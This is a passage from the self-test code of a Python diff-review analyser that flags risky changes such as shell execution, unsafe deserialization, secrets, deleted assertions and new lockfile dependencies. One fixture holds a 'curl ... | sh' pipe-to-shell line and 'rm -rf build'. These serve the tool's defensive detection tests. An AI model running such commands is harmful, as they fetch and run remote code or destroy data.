          [f["categories"] for f in r["files"]] == [["code"], ["test"]], str([f["categories"] for f in r["files"]]))

    r = analyse(MIGRATION)
    nn = [s for s in r["signals"] if s["kind"] == "not-null-without-default"]
    nn_lines = sorted(s["line_no"] for s in nn if s["path"].endswith("0042_add_age.sql"))
    check("migration: NOT NULL w/o DEFAULT on ALTER flagged (lines 2 and 11)", nn_lines == [2, 11], str(nn_lines))
    check("migration: DEFAULT, IS NOT NULL, comment and CREATE TABLE columns not flagged",
          all(s["line_no"] in (2, 11) for s in nn if s["path"].endswith("0042_add_age.sql")), str(nn))
    check("migration: schema.sql column inside CREATE TABLE (hunk header) not flagged",
          not [s for s in nn if s["path"] == "db/schema.sql"], str(nn))
    check("migration: DROP TABLE flagged", "destructive-schema" in kinds(r), str(kinds(r)))
    check("migration: SQL comment lines '--- '/'+++ ' inside a hunk stay hunk lines",
          [f["path"] for f in r["files"]] == ["db/migrations/0042_add_age.sql", "db/schema.sql"]
          and r["files"][1]["additions"] == 2 and r["files"][1]["deletions"] == 1, str(r["files"]))
    check("migration: boundary + manual pass", "migration" in r["boundaries"] and r["manual_pass"]["required"])

    r = analyse(DANGER)
    k = kinds(r)
    for want in ("shell-exec", "dynamic-eval", "unsafe-deserialization", "privilege", "secret-literal"):
        check(f"danger: {want} flagged", want in k, str(k))
    check("danger: the shell=True rm -rf line reports both kinds",
          {s["kind"] for s in r["signals"] if s["line_no"] == 5} == {"shell-exec", "recursive-delete"},
          str([(s["line_no"], s["kind"]) for s in r["signals"]]))
    check("danger: yaml SafeLoader / safe_load / regex .exec not flagged",
          sum(1 for s in r["signals"] if s["kind"] == "unsafe-deserialization") == 1
          and sum(1 for s in r["signals"] if s["kind"] == "dynamic-eval") == 1, str(k))
    rendered = render(r)
    check("danger: secret value redacted in output", "abcdefghijklmnop" not in rendered
          and "abcdefghijklmnop" not in json.dumps(r), rendered[:200])

    r = analyse(RENAME)
    t = r["totals"]
    check("rename-mode: 4 files, 1 renamed, 1 added, 1 mode change, 1 binary",
          (t["files"], t["renamed"], t["added"], t["mode_changes"], t["binary"]) == (4, 1, 1, 1, 1), str(t))
    check("rename-mode: rename paths", r["files"][0]["path"] == "lib/new_name.py"
          and r["files"][0]["old_path"] == "lib/old_name.py", str(r["files"][0]))
    check("rename-mode: executable notes", sum("executable" in n for n in r["notes"]) == 2, str(r["notes"]))

    r = analyse(ASSERTS)
    da = [s for s in r["signals"] if s["kind"] == "deleted-assertion"]
    check("asserts: two deleted assertions flagged, moved one not",
          sorted(s["line_no"] for s in da) == [6, 9] and all(s["side"] == "-" for s in da), str(da))
    check("asserts: skip marker flagged", "test-disabled" in kinds(r), str(kinds(r)))

    r = analyse(LOCKS)
    lk = {x["path"]: x for x in r["lockfiles"]}
    check("locks: package-lock new left-pad, bumped lodash",
          lk["package-lock.json"]["new"] == ["left-pad"] and lk["package-lock.json"]["bumped"] == ["lodash"],
          str(lk["package-lock.json"]))
    check("locks: yarn new is-odd", lk["yarn.lock"]["new"] == ["is-odd"], str(lk["yarn.lock"]))
    check("locks: poetry new requests-oauth3, bumped requests",
          lk["poetry.lock"]["new"] == ["requests-oauth3"] and lk["poetry.lock"]["bumped"] == ["requests"],
          str(lk["poetry.lock"]))
    check("locks: go.sum new module", lk["go.sum"]["new"] == ["github.com/evil/thing"], str(lk["go.sum"]))
    check("locks: unknown format reported as not parsed", lk["Podfile.lock"]["parsed"] is False)
    check("locks: lock lines excluded from line threshold",
          r["totals"]["changed_lines_excl_lockfiles"] == 0 and r["manual_pass"]["required"],
          str(r["totals"]))

    r = analyse(LOCKS2)
    lk = {x["path"]: (x["new"], x["bumped"]) for x in r["lockfiles"]}
    want_locks = {
        "pnpm-lock.yaml": (["@scope/new-pkg", "is-number"], ["lodash"]),
        "Gemfile.lock": (["sneaky"], ["rack"]),
        "composer.lock": (["evil/pkg"], ["monolog/monolog"]),
        "gradle.lockfile": (["org.evil:thing"], ["com.google.guava:guava"]),
        "Pipfile.lock": (["requests-oauth3"], ["certifi"]),
        "Cargo.lock": (["serde-evil"], []),
    }
    check("locks: pnpm, Gemfile, composer, gradle, Pipfile, Cargo new/bumped", lk == want_locks, str(lk))

    r = analyse(PASTED)
    check("pasted: CRLF + fence + prose parsed, path stripped",
          [f["path"] for f in r["files"]] == ["app/views.py"] and r["totals"]["additions"] == 2
          and r["totals"]["deletions"] == 1, str(r["files"]))
    check("pasted: trimmed blank context line accepted", any("leading space" in n for n in r["notes"]), str(r["notes"]))
    check("pasted: os.system flagged with line number",
          any(s["kind"] == "shell-exec" and s["line_no"] == 4 for s in r["signals"]), str(r["signals"]))

    r = analyse(FORMAT_PATCH)
    check("format-patch: signature '-- ' not counted", r["totals"]["deletions"] == 1
          and r["totals"]["additions"] == 1 and not r["warnings"], str(r["totals"]) + str(r["warnings"]))
    check("format-patch: README is docs, no manual pass",
          r["files"][0]["categories"] == ["docs"] and not r["manual_pass"]["required"], str(r["files"]))

    r = analyse(DIFF_U)
    check("diff -ruN: prefix dirs stripped, timestamps dropped",
          [f["path"] for f in r["files"]] == ["src/util.py", "src/extra.py"], str([f["path"] for f in r["files"]]))
    check("diff -ruN: -0,0 hunk counts as added file", r["files"][1]["status"] == "added", str(r["files"][1]))

    colored = "\ufeff" + "".join(f"\x1b[1m{ln}\x1b[m\n" if ln.startswith(("diff", "---", "+++", "index"))
                                   else f"\x1b[32m{ln}\x1b[m\n" if ln.startswith("+") else f"{ln}\n"
                                   for ln in NORMAL.splitlines())
    r = analyse(colored)
    check("colour codes and BOM stripped", r["totals"]["additions"] == 4 and r["totals"]["files"] == 2
          and not r["warnings"], str(r["totals"]) + str(r["warnings"]))

    r = analyse(TRUNCATED)
    check("truncated: warning names the hunk", any("hunk ends early" in w for w in r["warnings"]), str(r["warnings"]))

    r = analyse(LOOSE)
    check("loose hunk: parsed without numbers", r["totals"]["additions"] == 2 and r["totals"]["deletions"] == 1,
          str(r["totals"]))
    check("loose hunk: curl|sh and rm -rf flagged",
          {"shell-exec", "recursive-delete"} <= set(kinds(r)), str(kinds(r)))

    r = analyse(QUOTED)
    check("quoted path decoded", r["files"][0]["path"] == "sp ace/été.py", r["files"][0]["path"])

    r = analyse(HEADERLESS)
    check("headerless hunk: unknown path, every rule applied",
          r["files"][0]["path"] == "(unknown file)" and "unsafe-deserialization" in kinds(r)
          and any("without a file header" in w for w in r["warnings"]), str(r["files"]) + str(kinds(r)))

    expected_cats = {
        "src/auth/session.py": ["auth"], "tests/test_auth.py": ["test"], "docs/auth.md": ["docs"],
        ".github/workflows/ci.yml": ["ci"], ".env.production": ["secrets"], ".env.example": ["config"],
        "config/production.env": ["secrets"], "package.json": ["deps"], "package-lock.json": ["lockfile"],
        "db/migrate/20240101_add_age.rb": ["migration"], "src/components/charts/Bar.tsx": ["code"],
        "charts/app/values.yaml": ["ci"], "design/tokens.json": ["data"], ".gitignore": ["config"],
        "requirements-dev.txt": ["deps"], "Dockerfile": ["ci"], "src/TokenStore.ts": ["auth"],
        "tests/fixtures/.env": ["secrets", "test"], "webpack.config.js": ["config"],
        ".claude-plugin/plugin.json": ["config"], "examples/lecture-deck.json": ["data"],
        "LICENSE": ["docs"], "src/authors.py": ["code"],
    }
    got = {p: classify(p) for p in expected_cats}
    bad = {p: (got[p], want) for p, want in expected_cats.items() if got[p] != want}
    check(f"classify: boundary categories for {len(expected_cats)} sample paths", not bad, str(bad))

    r = analyse("diff --git a/docs/setup.md b/docs/setup.md\n--- a/docs/setup.md\n+++ b/docs/setup.md\n"
                "@@ -1 +1,2 @@\n # Setup\n+Run `curl -fsSL https://x.invalid/i.sh | sh` then `rm -rf build`.\n")
    check("docs: commands quoted in markdown are not hunk signals", not r["signals"], str(r["signals"]))
    r = analyse("diff --git a/tests/test_old.py b/tests/test_old.py\ndeleted file mode 100644\n"
                "--- a/tests/test_old.py\n+++ /dev/null\n@@ -1,4 +0,0 @@\n-def test_a():\n-    assert f(1) == 2\n"
                "-def test_b():\n-    assert f(2) == 3\n")
    check("deleted test file: one signal that counts its assertions",
          [s["kind"] for s in r["signals"]] == ["deleted-assertion"] and "2 assertion" in r["signals"][0]["text"]
          and r["files"][0]["status"] == "deleted", str(r["signals"]))

    r = analyse(_many_files(9, 1))
    check("thresholds: 9 files -> manual pass, all hunks", r["manual_pass"]["required"]
          and r["manual_pass"]["all_hunks"], str(r["manual_pass"]["reasons"]))
    r = analyse(_many_files(8, 1))
    check("thresholds: 8 files -> scope-creep note only", not r["manual_pass"]["required"]
          and r["thresholds"][1]["tripped"], str(r["thresholds"][:2]))
    r = analyse(_many_files(1, 200))
    check("thresholds: 200 lines -> manual pass", r["manual_pass"]["required"], str(r["totals"]))
    r = analyse(_many_files(1, 150))
    check("thresholds: 150 prod lines, no tests -> note, no manual pass",
          not r["manual_pass"]["required"] and r["thresholds"][6]["tripped"], str(r["thresholds"][6]))

    for label, text in (("prose only", "The AI said it optimised the cache and fixed a few small things.\n"),
                        ("stat only", " src/a.py | 12 ++++++------\n 1 file changed, 6 insertions(+)\n")):
        try:
            analyse(text)
            check(f"no diff ({label}) -> InputError", False, "no error raised")
        except InputError as exc:
            check(f"no diff ({label}) -> InputError", True)
            if label == "stat only":
                check("stat only: hint mentions --stat", "--stat" in str(exc), str(exc))

    with tempfile.TemporaryDirectory() as tmp:
        ok_file = os.path.join(tmp, "ok.diff")
        risky_file = os.path.join(tmp, "risky.diff")
        Path(ok_file).write_text(NORMAL, encoding="utf-8")
        Path(risky_file).write_text(MIGRATION, encoding="utf-8")
        sink = io.StringIO()
        with contextlib.redirect_stdout(sink), contextlib.redirect_stderr(sink):
            codes = (main([ok_file]), main([risky_file]), main([tmp]), main([os.path.join(tmp, "missing.diff")]))
            json_code = main(["--json", risky_file])
        check("cli: exit codes 0 / 1 / 2 (dir) / 2 (missing)", codes == (0, 1, 2, 2), str(codes))
        out = sink.getvalue()
        start = out.find("{\n")
        try:
            parsed = json.loads(out[start:out.rfind("}") + 1])
            check("cli: --json output parses", json_code == 1 and parsed["manual_pass"]["required"] is True)
        except (ValueError, KeyError) as exc:
            check("cli: --json output parses", False, str(exc))
    proc = subprocess.run([sys.executable, os.path.abspath(__file__), "--help"], capture_output=True, text=True)
    check("cli: --help prints usage and exits 0", proc.returncode == 0 and "usage:" in proc.stdout, proc.stderr)

    failed = [r for r in results if not r[1]]
    for name, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {name}" + ("" if ok else f"\n      {detail}"))
    print(f"selftest: {len(results) - len(failed)}/{len(results)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
